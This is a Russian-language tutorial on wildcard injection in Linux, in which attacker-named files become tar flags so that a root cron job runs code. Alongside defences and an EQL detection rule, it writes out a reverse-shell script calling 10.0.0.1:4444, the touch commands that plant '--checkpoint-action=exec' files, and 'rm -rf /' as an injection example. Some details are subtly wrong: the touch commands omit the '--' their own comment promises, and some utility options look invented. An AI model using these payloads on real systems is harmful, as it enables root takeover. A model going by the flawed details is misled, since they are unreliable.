# Инъекция через специальные имена файлов (Wildcard Injection) в Linux

## Контекст и базовые понятия

Инъекция через специальные имена файлов (Wildcard Injection) — это техника повышения привилегий в операционных системах семейства Unix/Linux, основанная на манипуляции механизмом глоббинга (globbing) оболочки. Уязвимость возникает, когда привилегированный процесс (например, скрипт, выполняемый от имени `root`, или задача `cron`) использует символы подстановки (чаще всего `*`) для обработки файлов в директории, доступной для записи атакующему.

Механизм глоббинга является функцией оболочки (shell), а не самой команды. Перед тем как передать аргументы исполняемому файлу, оболочка (например, `bash`) расширяет символы `*`, `?`, `[...]` в список соответствующих им имен файлов в текущем рабочем каталоге. Если атакующий может создавать файлы в этой директории, он может создать файл, имя которого начинается с дефиса (`-`). При расширении глоббинга этот файл попадает в список аргументов команды. Поскольку большинство утилит командной строки воспринимают аргументы, начинающиеся с `-`, как флаги (опции), а не как имена файлов, происходит интерпретация вредоносного имени файла как команды или параметра.

Эта техника относится к тактике **Privilege Escalation** (T1548.001 — Setuid and Setgid, или T1059.004 — Command and Scripting Interpreter: Unix Shell) в матрице MITRE ATT&CK, так как позволяет непривилегированному пользователю выполнить произвольный код с правами более высокого уровня.

Ключевое разграничение: Wildcard Injection часто путают с классической инъекцией команд (Command Injection). При Command Injection атакующий внедряет код непосредственно в строку запроса (например, через переменную окружения или параметр скрипта, который затем передается в `eval` или `system()`). При Wildcard Injection атакующий не меняет саму команду или скрипт; он меняет **контекст выполнения**, создавая объекты (файлы), которые оболочка интерпретирует как часть команды. Уязвимость находится не в коде утилиты, а в логике её вызова внутри скрипта или конфигурации.

| Характеристика | Wildcard Injection (Глоббинг) | Command Injection (Внедрение кода) |
| :--- | :--- | :--- |
| **Механизм эксплуатации** | Создание файлов с именами, интерпретируемыми как флаги/опции. | Внедрение символов разделения команд (`;`, `|`, `&&`) в входные данные. |
| **Зона уязвимости** | Оболочка (shell) при расширении аргументов. | Приложение или скрипт, передающий данные в `system()`, `eval()`, `exec()`. |
| **Требования к среде** | Доступ на запись в директорию, где выполняется команда. | Доступ на запись в переменную, файл или параметр, передаваемый в уязвимую функцию. |
| **Пример уязвимой команды** | `tar -czf backup.tar *` | `system("echo " + user_input)` |
| **Роль атакующего** | Создание файла `--checkpoint=1`. | Ввод строки `; rm -rf /`. |
| **Зависимость от оболочки** | Критическая (зависит от правил globbing). | Независимая (зависит от языка выполнения). |

## Внутреннее устройство предмета

Для понимания механики инъекции необходимо рассмотреть три компонента: механизм глоббинга, поведение уязвимых утилит и структуру аргументов.

### Механизм глоббинга и порядок расширения

В оболочках Bash/Zsh глоббинг происходит на этапе разбора командной строки. Когда встречается символ `*`, оболочка сканирует текущий каталог и заменяет `*` на отсортированный по алфавиту список имен файлов. Важно понимать, что порядок файлов в списке зависит от локальных настроек (locale) и имен файлов. Если в директории есть файлы `a.txt`, `b.txt` и `--checkpoint=1`, то команда `tar *` будет преобразована в `tar --checkpoint=1 a.txt b.txt`.

Поскольку утилиты POSIX обычно сканируют аргументы слева направо, первый аргумент, начинающийся с `-`, интерпретируется как начало опции. Если атакующий контролирует имена файлов, он может поместить свой «вредоносный» файл первым в лексикографическом порядке (например, создав файл с именем, начинающимся на символ, идущий перед `a` в ASCII, или используя специальные имена, которые сортируются в начале).

### Класс уязвимых утилит

Не все утилиты уязвимы. Уязвимость присутствует только в тех программах, которые:
1.  Принимают имена файлов в качестве аргументов (а не через stdin).
2.  Имеют опции, начинающиеся с `-`, которые могут быть использованы для выполнения кода или изменения критического поведения.
3.  Не используют разделитель `--` для обозначения конца опций.

Основные классы утилит, подверженные этой атаке:

| Утилита | Уязвимая опция / Механизм | Описание воздействия |
| :--- | :--- | :--- |
| **tar** | `--checkpoint-action=exec=<cmd>` | Позволяет выполнить произвольную команду на каждом контрольном пункте архивирования. |
| **rsync** | `-e <cmd>` | Позволяет указать произвольную удаленную оболочку для передачи данных. |
| **zip** | `-e <cmd>` / `--unzip-command` | Позволяет указать команду для распаковки или шифрования. |
| **chown** | `--reference=<file>` | Позволяет скопировать владельца/права с указанного файла на все остальные. |
| **chmod** | `--reference=<file>` | Позволяет скопировать права доступа с указанного файла на все остальные. |
| **7z** | `-sexec` | Позволяет выполнить команду после извлечения архива. |
| **find** | `-exec` / `-ok` | Хотя `find` сам по себе не расширяет глоббинг так же, как `tar`, скрипты, использующие `find ... -exec ... {} \;` с глоббингом, могут быть уязвимы, если атакующий создает файлы с именами, прерывающими аргументы. |

### Структура аргументов и разделитель `--`

Стандарт POSIX определяет, что опции должны заканчиваться разделителем `--`. Всё, что идет после `--`, интерпретируется исключительно как имена файлов, даже если они начинаются с `-`.

```text
[Команда] [Опции] [--] [Имена файлов]
```

Если скрипт написан небрежно и не использует `--` перед передачей глоббинг-результата, уязвимость реализуема. Например:
`tar -czf backup.tar *` — уязвим.
`tar -czf backup.tar -- *` — безопасен (при условии, что `*` не расширяется в пустоту, что тоже может быть проблемой в некоторых версиях, но `--` защищает от интерпретации имен как опций).

### Индикаторы наличия уязвимости

1.  **Скрипты с `cron`**: Задачи cron часто выполняются от имени `root` и могут использовать глоббинг для обработки файлов в `/var/spool/cron` или рабочих директориях приложений.
2.  **Скрипты резервного копирования**: Часто используют `tar`, `zip`, `rsync` для архивирования директорий, доступных для записи веб-серверу или другим сервисам.
3.  **Скрипты обработки данных**: Скрипты, которые переименовывают, меняют права (`chmod`) или владельцев (`chown`) файлов в директориях загрузки (upload directories).

## Применение и работа с предметом

На практике тестировщик на проникновение или специалист по защите информации работает с этой темой в двух направлениях: эксплуатация (для подтверждения уязвимости) и детекция/защита.

### Эксплуатация: Подготовка среды

Для успешной инъекции необходимо выполнить три условия:
1.  Найти скрипт или задачу, выполняемую с повышенными привилегиями.
2.  Определить директорию, в которой выполняется команда и где атакующий имеет права на запись.
3.  Определить уязвимую утилиту и её флаги.

**Шаг 1: Поиск уязвимых скриптов.**
Используются инструменты разведки, такие как `LinPEAS` или `LinEnum`, или ручной поиск по `sudo -l` и файлам `cron`.

```bash
# Проверка прав sudo
sudo -l

# Поиск скриптов cron, выполняемых от root
crontab -l
ls -la /etc/cron*
```

**Шаг 2: Создание полезной нагрузки (Payload).**
Выбор имени файла зависит от утилиты. Для `tar` классическим примером является использование флага `--checkpoint-action`.

```bash
# Создаем файл-обертку, который будет выполнен как скрипт
echo '#!/bin/bash' > shell.sh
echo '/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' >> shell.sh
chmod +x shell.sh

# Создаем файлы, которые будут интерпретированы как флаги tar
# Важно: имена должны сортироваться ДО обычных файлов
touch --checkpoint=1
touch --checkpoint-action=exec=sh\ shell.sh
```

**Шаг 3: Запуск уязвимой команды.**
Если скрипт выполняется автоматически (например, cron), атакующий ждет его запуска. Если есть возможность выполнить команду вручную от имени root (через `sudo` или SUID), это делается вручную.

```bash
# Имитация выполнения уязвимого скрипта
sudo tar -czf /tmp/backup.tar *
```

### Детекция и защита

Для защиты от Wildcard Injection необходимо применять принцип «не доверяй входным данным» и использовать стандартные разделители.

**Рекомендации по защите:**
1.  **Использование `--`**: Всегда помещайте `--` перед списком файлов в скриптах.
    *   *Небезопасно:* `tar -czf backup.tar *`
    *   *Безопасно:* `tar -czf backup.tar -- *`
2.  **Использование `-T -`**: Для утилит, поддерживающих чтение списка файлов из stdin (например, `tar -T -`). Это исключает глоббинг оболочки.
    *   `ls | tar -czf backup.tar -T -`
3.  **Квотирование**: Использование кавычек для переменных, хотя это не всегда помогает с глоббингом внутри скрипта, если сам скрипт написан небрежно.
4.  **Мониторинг (SIEM)**: Создание правил детекции на основе аномалий в запуске процессов.

**Пример правила детекции (Elastic EQL):**
Правило должно искать последовательность: запуск уязвимой утилиты с флагом, указывающим на инъекцию, за которым следует запуск оболочки.

```eql
process where
  event.type == "start" and
  process.name : ("tar", "rsync", "zip", "chown", "chmod") and
  process.args : ("--checkpoint-action=*", "-e*", "--unzip-command=*") and
  process.parent.name : ("bash", "sh", "cron")
```

## Сквозной практический пример: Эксплуатация через Cron и Tar

**Исходные условия:**
*   **Среда:** Виртуальная машина с Linux (Ubuntu 22.04).
*   **Роль:** Пользователь `attacker` с правами на запись в директорию `/var/www/html/uploads`.
*   **Уязвимость:** В файле `/etc/cron.d/backup` настроена задача, выполняемая от имени `root` каждые 5 минут.
*   **Содержимое cron-задачи:**
    ```bash
    */5 * * * * root cd /var/www/html/uploads && tar -czf /tmp/backup_$(date +%s).tar *
    ```
    Задача меняет рабочую директорию на `/var/www/html/uploads` и архивирует все файлы в ней, используя глоббинг `*`.

**Шаг 1: Анализ и подготовка директории**
Атакующий подтверждает наличие прав на запись в целевую директорию и создает файлы-палки (stubs), которые будут интерпретированы `tar` как флаги.

```bash
# Переход в целевую директорию
cd /var/www/html/uploads

# Создание файла, который будет интерпретирован как флаг --checkpoint=1
# Используем touch с флагом -- для предотвращения интерпретации имени как опции touch
touch --checkpoint=1

# Создание файла, который будет интерпретирован как флаг --checkpoint-action=exec=sh shell.sh
# Экранирование пробела необходимо, чтобы имя файла содержало пробел, но для globbing это будет один аргумент
touch --checkpoint-action=exec=sh\ shell.sh

# Создание самого скрипта, который будет выполнен
echo '#!/bin/bash' > shell.sh
echo 'id > /tmp/pwned.txt' >> shell.sh
chmod +x shell.sh

# Проверка содержимого директории
ls -la
```

*Ожидаемый вывод:*
В директории появятся файлы:
`--checkpoint=1`
`--checkpoint-action=exec=sh shell.sh`
`shell.sh`
(Имена файлов отсортированы лексикографически. `--checkpoint=1` идет перед `--checkpoint-action...` и перед `shell.sh` в зависимости от локалей, но главное — они идут ДО любых обычных файлов, если таковые есть).

**Шаг 2: Ожидание выполнения или ручная симуляция**
Так как cron выполняется от `root`, мы можем симулировать выполнение для проверки.

```bash
# Симуляция того, что сделает cron
sudo tar -czf /tmp/test.tar *
```

*Ожидаемый результат:*
Команда `tar` получает аргументы:
`tar -czf /tmp/test.tar --checkpoint=1 --checkpoint-action=exec=sh shell.sh`
`tar` начинает архивирование. При достижении первого контрольного пункта (так как указан `--checkpoint=1`), он выполняет действие `exec=sh shell.sh`.

**Шаг 3: Проверка результата**
После выполнения команды (или через 5 минут, если ждать cron):

```bash
# Проверка, выполнился ли код от имени root
cat /tmp/pwned.txt
```

*Ожидаемый вывод:*
Вывод команды `id`, показывающий `uid=0(root) gid=0(root)`. Это подтверждает, что скрипт `shell.sh` был выполнен с правами root, а не правами пользователя `attacker`.

**Ожидаемый вывод примера:**
Пример демонстрирует, как отсутствие разделителя `--` в команде `tar` в сочетании с доступом на запись в рабочую директорию позволяет непривилегированному пользователю выполнить произвольный код от имени root. Это классический сценарий повышения привилегий через небрежную конфигурацию cron или скриптов резервного копирования.

## Аналитический вывод

Инъекция через специальные имена файлов (Wildcard Injection) представляет собой опасную уязвимость конфигурации, а не кода. Она эксплуатирует фундаментальное поведение оболочек Unix, разделяя ответственность за безопасность между разработчиком скрипта (должен использовать `--` или `-T -`) и администратором системы (должен ограничивать права доступа к рабочим директориям).

Ключевые выводы для специалистов по безопасности:
1.  **Контекст критичен:** Уязвимость существует только при наличии доступа на запись в директорию, где выполняется команда, и при использовании утилит, поддерживающих флаги, начинающиеся с `-`.
2.  **Защита проста:** Использование разделителя `--` перед списком файлов является стандартом де-факто для предотвращения этой атаки.
3.  **Детекция сложна:** В SIEM-системах необходимо мониторить не только запуск уязвимых утилит, но и наличие аномальных флагов в их аргументах, а также последующий запуск оболочек (`bash`, `sh`).
4.  **Широта применения:** Атака применима не только к `tar`, но и к `rsync`, `zip`, `chown`, `chmod`, что требует комплексного аудита скриптов автоматизации и cron-задач.
